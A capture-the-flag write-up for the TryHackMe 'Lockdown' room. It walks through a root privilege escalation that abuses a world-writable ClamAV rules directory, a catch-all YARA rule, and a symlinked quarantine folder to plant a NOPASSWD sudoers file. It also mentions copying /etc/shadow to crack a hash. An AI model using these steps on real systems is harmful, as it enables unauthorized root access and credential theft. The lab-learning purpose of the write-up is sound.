# Lockdown: a slightly unintended privilege escalation

There are plenty of excellent writeups about this nice challenge by hangrymoose ([https://tryhackme.com/p/hangrymoose](https://tryhackme.com/room/lockdown)). You can find them here: [https://tryhackme.com/room/lockdown](https://tryhackme.com/room/lockdown).

Since I'm a lazy person, I just want to show a sligthly different way of getting root by file *writing*, using a custom sudoers configuration.

The vulnerability that gives us the ability to read arbitrary files is related to the `/opt/scan/scan.sh` script and the fact that we can write arbitrary rules in the `/var/lib/clamav` directory (which has 777 permissions).

The incriminated script is:

```bash
#!/bin/bash

read -p "Enter path: " TARGET

if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi
```

Many users have already explained how to write a custom yara rule which identifies every file as "virus", so we can copy them in our quarantine directory, actually reading `/root/root.txt` or `/etc/shadow` for instance (this gives us user maxine password hash which, once cracked, gives us root given maxine permissions).

But notice that chown by default does not follow symbolic links so, if we substitute the quarantine directory with a link to `/etc/sudoers.d/` we should be able to place an arbitrary "virus" file in `/etc/sudoers.d`, thus elevating our privileges.


So first we write our custom YARA rule:

```bash
cat > /var/lib/clamav/foo.yara <<EOF
rule CheckFileSize
{
  strings:
    \$abc = "abc"
  condition:
    (\$abc or not \$abc)
}
EOF
```

and place a symbolic link that points to the sudoers.d directory:

```
rmdir quarantine/
ln -s /etc/sudoers.d quarantine
```

We then prepare a custom sudoers configuration:

```
echo "cyrus ALL=(ALL:ALL) NOPASSWD:ALL" > evil_sudoers_file
```

and finally we run scan.sh


```
echo evil_sudoers_file | sudo /opt/scan/scan.sh 
/home/cyrus/evil_sudoers_file: YARA.CheckFileSize.UNOFFICIAL FOUND
/home/cyrus/evil_sudoers_file: copied to '/etc/sudoers.d/evil_sudoers_file'

----------- SCAN SUMMARY -----------
Known viruses: 2
Engine version: 0.103.2
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 0.008 sec (0 m 0 s)
Start Date: 2021:10:03 14:01:29
End Date:   2021:10:03 14:01:29
```

Notice sudo -l output:

```
cyrus@lockdown:~$ sudo -l
Matching Defaults entries for cyrus on lockdown:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cyrus may run the following commands on lockdown:
    (root) /opt/scan/scan.sh
    (ALL : ALL) NOPASSWD: ALL
```

At this point we can just `sudo -i`
